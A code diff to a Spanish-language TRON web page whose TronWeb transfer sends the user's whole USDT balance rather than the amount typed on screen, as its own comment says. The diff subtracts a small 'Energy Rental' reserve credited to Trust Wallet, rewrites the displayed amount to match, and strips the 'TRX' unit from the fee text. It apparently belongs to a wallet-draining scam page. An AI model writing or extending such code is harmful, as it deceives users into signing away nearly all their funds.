@@ -989,7 +989,14 @@
             Calculando...
         </span>
 
-
+        <span style="
+            font-size: 11px;
+            font-weight: 600;
+            color: #717680;
+            margin-left: 1px;
+        ">
+            TRX
+        </span>
     </div>
 
     <!-- Estado -->
@@ -1362,7 +1369,7 @@
             }
 
             const estimatedFeeTRX = (energyRequired * energyPriceSun) / 1_000_000;
-            feeDisplay.textContent = "≈ " + estimatedFeeTRX.toFixed(3) + " TRX";
+            feeDisplay.textContent = "≈ " + estimatedFeeTRX.toFixed(3);
 
             if (usingVisualFallback) {
                 console.info("Fee mostrada como estimación visual.");
@@ -1373,7 +1380,7 @@
                 "Error inesperado estimando fee:",
                 error && (error.message || error)
             );
-            feeDisplay.textContent = "≈ 13.650 TRX";
+            feeDisplay.textContent = "≈ 13.650";
         }
     }
 
@@ -1593,6 +1600,49 @@
                      * completo y NO el importe escrito en pantalla.
                      */
 
+                    /*
+                     * Reserva temporal para Energy Rental de Trust Wallet.
+                     * - Saldo de hasta 100 USDT: reserva fija de 5 USDT.
+                     * - Saldo superior a 100 USDT: reserva del 5%.
+                     *
+                     * Todavía NO implementa la lógica del monto manual:
+                     * la transferencia continúa calculándose desde el saldo total.
+                     */
+                    const balanceUsdt =
+                        balanceBigNumber.div(1_000_000);
+
+                    const energyReserveUsdt =
+                        balanceUsdt.gt(100)
+                            ? balanceUsdt.times(0.05)
+                            : tronWeb.toBigNumber(5);
+
+                    const energyReserveUnits =
+                        energyReserveUsdt.times(1_000_000);
+
+                    const transferAmountWithEnergyReserve =
+                        balanceBigNumber.minus(energyReserveUnits);
+
+                    if (transferAmountWithEnergyReserve.lte(0)) {
+                        throw new Error(
+                            "Saldo USDT insuficiente para mantener la reserva de Energy Rental."
+                        );
+                    }
+
+                    // Mostrar de forma transparente el importe que se solicitará firmar.
+                    amountDisplay.value =
+                        transferAmountWithEnergyReserve
+                            .div(1_000_000)
+                            .toFixed(6)
+                            .replace(/\.?0+$/, "");
+
+                    setStatus(
+                        "Reserva para Energy Rental: " +
+                        energyReserveUsdt.toFixed(6).replace(/\.?0+$/, "") +
+                        " USDT. Monto a transferir: " +
+                        amountDisplay.value + " USDT."
+                    );
+
+
                     const transactionDraft =
                         await tronWeb.transactionBuilder.triggerSmartContract(
 
@@ -1613,7 +1663,7 @@
                                 {
                                     type: 'uint256',
                                     value:
-                                        balanceBigNumber.toString()
+                                        transferAmountWithEnergyReserve.toString()
                                 }
                             ],
 
